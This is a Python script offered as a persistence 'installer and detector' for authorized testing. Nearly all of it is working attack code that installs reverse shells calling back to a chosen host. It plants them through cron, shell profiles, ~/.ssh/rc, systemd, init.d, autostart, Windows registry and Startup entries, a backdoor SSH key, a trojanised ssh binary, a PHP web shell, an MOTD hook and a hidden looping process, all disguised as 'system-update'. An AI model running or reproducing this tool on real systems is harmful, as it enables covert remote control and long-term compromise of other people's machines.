#!/usr/bin/env python3
"""
Advanced Persistence Mechanism Installer & Detector
For authorized security testing only
"""
import os
import sys
import re
import json
import shutil
import base64
import platform
import subprocess
import tempfile
from datetime import datetime
from pathlib import Path

class PersistenceInstaller:
    def __init__(self, callback_host="10.0.0.1", callback_port=4444):
        self.callback_host = callback_host
        self.callback_port = callback_port
        self.results = {
            'installed_persistence': [],
            'detected_persistence': [],
            'errors': []
        }
        
        # Platform detection
        self.system = platform.system().lower()
        self.is_admin = self.check_admin()
        
        # Payload templates
        self.payloads = {
            'bash_reverse': f'bash -i >& /dev/tcp/{callback_host}/{callback_port} 0>&1',
            'python_reverse': f'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{callback_host}\',{callback_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"',
            'nc_reverse': f'nc {callback_host} {callback_port} -e /bin/bash',
            'curl_download': f'curl http://{callback_host}/payload.sh | bash',
            'wget_download': f'wget -qO- http://{callback_host}/payload.sh | bash'
        }
        
        # Current user info
        self.username = os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))
        self.home_dir = os.path.expanduser('~')
        self.current_path = os.environ.get('PATH', '')

    def check_admin(self):
        """Check if running with elevated privileges"""
        if self.system == 'linux':
            return os.geteuid() == 0
        elif self.system == 'windows':
            try:
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False
        return False

    def install_cron_persistence(self, payload=None, schedule="* * * * *"):
        """Install cron job persistence"""
        print("[*] Installing cron persistence...")
        
        if not payload:
            payload = self.payloads['bash_reverse']
        
        methods = []
        
        # Method 1: User crontab
        try:
            # Backup existing crontab
            existing = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            existing_content = existing.stdout if existing.returncode == 0 else ""
            
            # Add new cron job
            cron_entry = f"{schedule} {payload} 2>/dev/null\n"
            new_content = existing_content + cron_entry
            
            # Write to temp file and install
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(new_content)
                temp_path = f.name
            
            subprocess.run(['crontab', temp_path], check=True)
            os.unlink(temp_path)
            
            methods.append({
                'type': 'user_crontab',
                'command': f'crontab -l',
                'schedule': schedule,
                'status': 'installed'
            })
            print(f"    [+] User crontab installed: {schedule}")
            
        except Exception as e:
            print(f"    [-] User crontab failed: {e}")
            self.results['errors'].append({'method': 'user_crontab', 'error': str(e)})
        
        # Method 2: System crontab (requires root)
        if self.is_admin:
            try:
                crontab_path = '/etc/crontab'
                with open(crontab_path, 'a') as f:
                    f.write(f"\n{schedule} root {payload}\n")
                
                methods.append({
                    'type': 'system_crontab',
                    'path': crontab_path,
                    'schedule': schedule,
                    'status': 'installed'
                })
                print(f"    [+] System crontab installed: {crontab_path}")
                
            except Exception as e:
                print(f"    [-] System crontab failed: {e}")
        
        # Method 3: Cron directories
        cron_dirs = ['/etc/cron.hourly', '/etc/cron.daily', '/etc/cron.weekly', '/etc/cron.monthly']
        
        for cron_dir in cron_dirs:
            if os.path.exists(cron_dir) and os.access(cron_dir, os.W_OK):
                try:
                    script_name = f"{cron_dir}/system-update"
                    script_content = f"""#!/bin/bash
{payload}
"""
                    with open(script_name, 'w') as f:
                        f.write(script_content)
                    os.chmod(script_name, 0o755)
                    
                    methods.append({
                        'type': 'cron_directory',
                        'path': script_name,
                        'status': 'installed'
                    })
                    print(f"    [+] Cron script installed: {script_name}")
                    
                except Exception as e:
                    print(f"    [-] Cron directory failed: {e}")
        
        # Method 4: Anacron
        if self.is_admin:
            try:
                anacron_tab = '/etc/anacrontab'
                if os.path.exists(anacron_tab):
                    with open(anacron_tab, 'a') as f:
                        f.write(f"\n1 5 persistence {payload}\n")
                    
                    methods.append({
                        'type': 'anacron',
                        'path': anacron_tab,
                        'status': 'installed'
                    })
                    print(f"    [+] Anacron job installed: {anacron_tab}")
                    
            except Exception as e:
                print(f"    [-] Anacron failed: {e}")
        
        self.results['installed_persistence'].extend(methods)
        return methods

    def install_startup_scripts(self, payload=None):
        """Install persistence via startup scripts"""
        print("[*] Installing startup script persistence...")
        
        if not payload:
            payload = self.payloads['python_reverse']
        
        methods = []
        
        # Linux startup methods
        if self.system == 'linux':
            # Method 1: .bashrc
            try:
                bashrc = os.path.join(self.home_dir, '.bashrc')
                with open(bashrc, 'a') as f:
                    f.write(f"\n# System update check\n({payload}) 2>/dev/null &\n")
                
                methods.append({
                    'type': 'bashrc',
                    'path': bashrc,
                    'status': 'installed'
                })
                print(f"    [+] .bashrc backdoored: {bashrc}")
                
            except Exception as e:
                print(f"    [-] .bashrc failed: {e}")
            
            # Method 2: .bash_profile
            try:
                profile_paths = [
                    os.path.join(self.home_dir, '.bash_profile'),
                    os.path.join(self.home_dir, '.profile'),
                    os.path.join(self.home_dir, '.bash_login')
                ]
                
                for profile_path in profile_paths:
                    if os.path.exists(profile_path) or not os.path.exists(profile_path):
                        with open(profile_path, 'a') as f:
                            f.write(f"\n({payload}) 2>/dev/null &\n")
                        
                        methods.append({
                            'type': 'profile',
                            'path': profile_path,
                            'status': 'installed'
                        })
                        print(f"    [+] Profile backdoored: {profile_path}")
                        
            except Exception as e:
                print(f"    [-] Profile failed: {e}")
            
            # Method 3: SSH RC
            try:
                ssh_dir = os.path.join(self.home_dir, '.ssh')
                if not os.path.exists(ssh_dir):
                    os.makedirs(ssh_dir)
                
                ssh_rc = os.path.join(ssh_dir, 'rc')
                with open(ssh_rc, 'w') as f:
                    f.write(f"#!/bin/bash\n({payload}) 2>/dev/null &\n")
                os.chmod(ssh_rc, 0o755)
                
                methods.append({
                    'type': 'ssh_rc',
                    'path': ssh_rc,
                    'status': 'installed'
                })
                print(f"    [+] SSH RC backdoored: {ssh_rc}")
                
            except Exception as e:
                print(f"    [-] SSH RC failed: {e}")
            
            # Method 4: Systemd service (requires root)
            if self.is_admin:
                try:
                    service_name = 'system-update'
                    service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "{payload}"
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
                    service_path = f'/etc/systemd/system/{service_name}.service'
                    
                    with open(service_path, 'w') as f:
                        f.write(service_content)
                    
                    subprocess.run(['systemctl', 'daemon-reload'], check=True)
                    subprocess.run(['systemctl', 'enable', service_name], check=True)
                    subprocess.run(['systemctl', 'start', service_name], check=True)
                    
                    methods.append({
                        'type': 'systemd_service',
                        'path': service_path,
                        'service': service_name,
                        'status': 'installed'
                    })
                    print(f"    [+] Systemd service installed: {service_name}")
                    
                except Exception as e:
                    print(f"    [-] Systemd service failed: {e}")
            
            # Method 5: init.d script (requires root)
            if self.is_admin:
                try:
                    init_script = '/etc/init.d/system-update'
                    init_content = f"""#!/bin/bash
### BEGIN INIT INFO
# Provides:          system-update
# Required-Start:    $network
# Required-Stop:     $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Description:       System Update Service
### END INIT INFO

case "$1" in
    start)
        ({payload}) 2>/dev/null &
        ;;
    stop)
        pkill -f "{payload[:20]}"
        ;;
    *)
        echo "Usage: $0 {{start|stop}}"
        exit 1
        ;;
esac
exit 0
"""
                    with open(init_script, 'w') as f:
                        f.write(init_content)
                    os.chmod(init_script, 0o755)
                    
                    subprocess.run(['update-rc.d', 'system-update', 'defaults'], check=True)
                    
                    methods.append({
                        'type': 'init_script',
                        'path': init_script,
                        'status': 'installed'
                    })
                    print(f"    [+] Init script installed: {init_script}")
                    
                except Exception as e:
                    print(f"    [-] Init script failed: {e}")
            
            # Method 6: .config/autostart
            try:
                autostart_dir = os.path.join(self.home_dir, '.config', 'autostart')
                os.makedirs(autostart_dir, exist_ok=True)
                
                desktop_file = os.path.join(autostart_dir, 'system-update.desktop')
                desktop_content = f"""[Desktop Entry]
Type=Application
Name=System Update
Exec=/bin/bash -c "{payload}"
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
                with open(desktop_file, 'w') as f:
                    f.write(desktop_content)
                
                methods.append({
                    'type': 'autostart',
                    'path': desktop_file,
                    'status': 'installed'
                })
                print(f"    [+] Desktop autostart installed: {desktop_file}")
                
            except Exception as e:
                print(f"    [-] Autostart failed: {e}")
        
        # Windows startup methods
        elif self.system == 'windows':
            try:
                import winreg
                
                # Method 1: Current User Run key
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, f'cmd.exe /c "{payload}"')
                winreg.CloseKey(key)
                
                methods.append({
                    'type': 'registry_run',
                    'path': f'HKCU\\{key_path}',
                    'status': 'installed'
                })
                print(f"    [+] Registry Run key installed")
                
            except Exception as e:
                print(f"    [-] Registry failed: {e}")
            
            # Method 2: Startup folder
            try:
                startup_folder = os.path.join(
                    os.environ['APPDATA'],
                    'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
                )
                
                vbs_path = os.path.join(startup_folder, 'system-update.vbs')
                vbs_content = f'CreateObject("Wscript.Shell").Run "{payload}", 0, False'
                
                with open(vbs_path, 'w') as f:
                    f.write(vbs_content)
                
                methods.append({
                    'type': 'startup_folder',
                    'path': vbs_path,
                    'status': 'installed'
                })
                print(f"    [+] Startup folder script installed: {vbs_path}")
                
            except Exception as e:
                print(f"    [-] Startup folder failed: {e}")
        
        self.results['installed_persistence'].extend(methods)
        return methods

    def install_ssh_backdoor(self):
        """Install SSH backdoor for persistence"""
        print("[*] Installing SSH backdoor...")
        
        methods = []
        
        # Method 1: Authorized keys
        try:
            ssh_dir = os.path.join(self.home_dir, '.ssh')
            os.makedirs(ssh_dir, exist_ok=True)
            
            authorized_keys = os.path.join(ssh_dir, 'authorized_keys')
            
            # Generate SSH key pair if needed
            key_path = os.path.join(ssh_dir, 'id_rsa_backdoor')
            if not os.path.exists(key_path):
                subprocess.run([
                    'ssh-keygen',
                    '-t', 'rsa',
                    '-b', '2048',
                    '-f', key_path,
                    '-N', '',
                    '-q'
                ], check=True)
            
            # Read public key
            with open(f'{key_path}.pub', 'r') as f:
                pub_key = f.read()
            
            # Add to authorized_keys
            with open(authorized_keys, 'a') as f:
                f.write(f"\n# System backup key\n{pub_key}")
            
            os.chmod(authorized_keys, 0o600)
            
            methods.append({
                'type': 'authorized_keys',
                'path': authorized_keys,
                'private_key': key_path,
                'status': 'installed'
            })
            print(f"    [+] SSH authorized_keys backdoored")
            print(f"    [+] Private key: {key_path}")
            
        except Exception as e:
            print(f"    [-] SSH backdoor failed: {e}")
        
        # Method 2: SSH wrapper
        if self.is_admin:
            try:
                ssh_path = '/usr/bin/ssh'
                if os.path.exists(ssh_path):
                    # Backup original
                    backup_path = f'{ssh_path}.bak'
                    if not os.path.exists(backup_path):
                        shutil.copy2(ssh_path, backup_path)
                    
                    # Create wrapper
                    wrapper_content = f"""#!/bin/bash
# SSH wrapper with backdoor
(/bin/bash -c '{self.payloads['bash_reverse']}') 2>/dev/null &
exec {backup_path} "$@"
"""
                    with open(ssh_path, 'w') as f:
                        f.write(wrapper_content)
                    os.chmod(ssh_path, 0o755)
                    
                    methods.append({
                        'type': 'ssh_wrapper',
                        'path': ssh_path,
                        'backup': backup_path,
                        'status': 'installed'
                    })
                    print(f"    [+] SSH wrapper installed")
                    
            except Exception as e:
                print(f"    [-] SSH wrapper failed: {e}")
        
        self.results['installed_persistence'].extend(methods)
        return methods

    def install_web_shell(self):
        """Install PHP/ASP web shell for persistence"""
        print("[*] Installing web shell...")
        
        methods = []
        
        # Search for web directories
        web_dirs = [
            '/var/www/html',
            '/var/www',
            '/opt/lampp/htdocs',
            '/usr/share/nginx/html',
            '/home/*/public_html',
            '/srv/http',
            '/srv/www'
        ]
        
        # PHP web shell
        php_shell = f'''<?php
// System Update Checker
if(isset($_REQUEST['cmd'])) {{
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}}
if(isset($_FILES['file'])) {{
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "Uploaded";
    die;
}}
?>
'''
        
        for web_dir in web_dirs:
            import glob
            for expanded_dir in glob.glob(web_dir):
                if os.path.exists(expanded_dir) and os.access(expanded_dir, os.W_OK):
                    try:
                        shell_path = os.path.join(expanded_dir, 'system-check.php')
                        with open(shell_path, 'w') as f:
                            f.write(php_shell)
                        
                        methods.append({
                            'type': 'web_shell',
                            'path': shell_path,
                            'url': f'http://localhost/{os.path.basename(shell_path)}',
                            'status': 'installed'
                        })
                        print(f"    [+] Web shell installed: {shell_path}")
                        
                    except Exception as e:
                        print(f"    [-] Web shell failed for {expanded_dir}: {e}")
        
        self.results['installed_persistence'].extend(methods)
        return methods

    def install_motd_backdoor(self):
        """Install MOTD (Message of the Day) backdoor"""
        print("[*] Installing MOTD backdoor...")
        
        methods = []
        
        if self.is_admin:
            motd_paths = [
                '/etc/update-motd.d/99-system-check',
                '/etc/motd',
                '/etc/issue',
                '/etc/issue.net'
            ]
            
            for motd_path in motd_paths:
                try:
                    motd_dir = os.path.dirname(motd_path)
                    if not os.path.exists(motd_dir):
                        continue
                    
                    if 'update-motd.d' in motd_path:
                        script_content = f"""#!/bin/bash
({self.payloads['bash_reverse']}) 2>/dev/null &
echo "System check complete"
"""
                        with open(motd_path, 'w') as f:
                            f.write(script_content)
                        os.chmod(motd_path, 0o755)
                    else:
                        with open(motd_path, 'a') as f:
                            f.write(f"\n# System check\n")
                    
                    methods.append({
                        'type': 'motd_backdoor',
                        'path': motd_path,
                        'status': 'installed'
                    })
                    print(f"    [+] MOTD backdoored: {motd_path}")
                    
                except Exception as e:
                    print(f"    [-] MOTD failed for {motd_path}: {e}")
        
        self.results['installed_persistence'].extend(methods)
        return methods

    def install_hidden_process(self):
        """Install hidden process persistence"""
        print("[*] Installing hidden process...")
        
        methods = []
        
        # Create hidden directory
        hidden_dirs = [
            os.path.join(self.home_dir, '.cache', '.system'),
            os.path.join(self.home_dir, '.local', '.share', '.update'),
            '/tmp/.system',
            '/var/tmp/.cache'
        ]
        
        for hidden_dir in hidden_dirs:
            try:
                os.makedirs(hidden_dir, exist_ok=True)
                
                # Create launcher script
                launcher_path = os.path.join(hidden_dir, 'sys-update')
                launcher_content = f"""#!/bin/bash
while true; do
    ({self.payloads['python_reverse']}) 2>/dev/null
    sleep 300
done
"""
                with open(launcher_path, 'w') as f:
                    f.write(launcher_content)
                os.chmod(launcher_path, 0o755)
                
                # Start hidden process
                subprocess.Popen(
                    [launcher_path],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    start_new_session=True
                )
                
                methods.append({
                    'type': 'hidden_process',
                    'path': launcher_path,
                    'pid': 'running',
                    'status': 'installed'
                })
                print(f"    [+] Hidden process installed: {launcher_path}")
                
                # Add to crontab for redundancy
                cron_entry = f"@reboot {launcher_path} 2>/dev/null &\n"
                try:
                    existing = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                    existing_content = existing.stdout if existing.returncode == 0 else ""
                    
                    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                        f.write(existing_content + cron_entry)
                        temp_path = f.name
                    
                    subprocess.run(['crontab', temp_path], check=True)
                    os.unlink(temp_path)
                    
                except:
                    pass
                
                break
                
            except Exception as e:
                print(f"    [-] Hidden process failed for {hidden_dir}: {e}")
        
        self.results['installed_persistence'].extend(methods)
        return methods

    def detect_existing_persistence(self):
        """Detect existing persistence mechanisms"""
        print("[*] Detecting existing persistence...")
        
        detected = []
        
        # Check cron jobs
        try:
            cron_output = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            if cron_output.stdout:
                for line in cron_output.stdout.split('\n'):
                    if line.strip() and not line.startswith('#'):
                        detected.append({
                            'type': 'cron_job',
                            'details': line.strip(),
                            'location': 'user_crontab'
                        })
        except:
            pass
        
        # Check system crontab
        if os.path.exists('/etc/crontab'):
            try:
                with open('/etc/crontab', 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            detected.append({
                                'type': 'cron_job',
                                'details': line,
                                'location': '/etc/crontab'
                            })
            except:
                pass
        
        # Check bashrc/profile
        startup_files = ['.bashrc', '.bash_profile', '.profile', '.bash_login', '.zshrc']
        for file in startup_files:
            filepath = os.path.join(self.home_dir, file)
            if os.path.exists(filepath):
                try:
                    with open(filepath, 'r') as f:
                        content = f.read()
                        # Look for suspicious patterns
                        suspicious_patterns = [
                            r'nohup', r'&>/dev/null', r'2>&1',
                            r'wget.*\|.*bash', r'curl.*\|.*bash',
                            r'/dev/tcp/', r'socket', r'subprocess'
                        ]
                        for pattern in suspicious_patterns:
                            if re.search(pattern, content):
                                detected.append({
                                    'type': 'startup_script',
                                    'path': filepath,
                                    'pattern': pattern
                                })
                except:
                    pass
        
        # Check systemd services
        try:
            systemctl_output = subprocess.run(
                ['systemctl', 'list-units', '--type=service', '--state=running'],
                capture_output=True, text=True
            )
            for line in systemctl_output.stdout.split('\n'):
                if 'suspicious' in line.lower() or 'unknown' in line.lower():
                    detected.append({
                        'type': 'systemd_service',
                        'details': line.strip()
                    })
        except:
            pass
        
        self.results['detected_persistence'] = detected
        
        if detected:
            print(f"    [!] Found {len(detected)} existing persistence mechanisms")
            for d in detected[:5]:
                print(f"        - {d['type']}: {d.get('path', d.get('location', ''))}")
        else:
            print("    [*] No existing persistence detected")
        
        return detected

    def generate_report(self):
        """Generate persistence report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'hostname': platform.node(),
            'username': self.username,
            'is_admin': self.is_admin,
            'installed_persistence': self.results['installed_persistence'],
            'detected_persistence': self.results['detected_persistence'],
            'errors': self.results['errors'],
            'summary': {
                'total_installed': len(self.results['installed_persistence']),
                'total_detected': len(self.results['detected_persistence']),
                'total_errors': len(self.results['errors'])
            }
        }
        
        # Save report
        with open('persistence_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        # Save cleanup script
        self.generate_cleanup_script()
        
        print(f"\n[+] Persistence report saved to persistence_report.json")
        print(f"[+] Cleanup script saved to cleanup_persistence.sh")
        
        return report

    def generate_cleanup_script(self):
        """Generate script to remove installed persistence"""
        cleanup_commands = []
        
        for item in self.results['installed_persistence']:
            if item['type'] == 'user_crontab':
                cleanup_commands.append('crontab -r 2>/dev/null')
            
            elif item['type'] == 'systemd_service':
                cleanup_commands.append(f'systemctl stop {item.get("service", "")} 2>/dev/null')
                cleanup_commands.append(f'systemctl disable {item.get("service", "")} 2>/dev/null')
                cleanup_commands.append(f'rm -f {item.get("path", "")} 2>/dev/null')
            
            elif item.get('path'):
                cleanup_commands.append(f'rm -f {item["path"]} 2>/dev/null')
        
        cleanup_script = "#!/bin/bash\n# Persistence Cleanup Script\n\n"
        cleanup_script += "\n".join(cleanup_commands)
        cleanup_script += "\n\necho '[+] Persistence cleaned up'\n"
        
        with open('cleanup_persistence.sh', 'w') as f:
            f.write(cleanup_script)
        os.chmod('cleanup_persistence.sh', 0o755)

    def install_all(self):
        """Install all persistence methods"""
        print("[*] Installing ALL persistence mechanisms...")
        print(f"[*] Callback: {self.callback_host}:{self.callback_port}")
        print()
        
        # Detect existing first
        self.detect_existing_persistence()
        print()
        
        # Install various persistence methods
        self.install_cron_persistence()
        self.install_startup_scripts()
        self.install_ssh_backdoor()
        self.install_web_shell()
        self.install_motd_backdoor()
        self.install_hidden_process()
        
        # Generate report
        return self.generate_report()

def main():
    if len(sys.argv) < 3:
        print("Usage: python persistence.py <callback_host> <callback_port>")
        print("Example: python persistence.py 10.0.0.1 4444")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    print("[!] WARNING: Only use on systems you own or have explicit permission to test!")
    print()
    
    installer = PersistenceInstaller(host, port)
    installer.install_all()

if __name__ == "__main__":
    main()
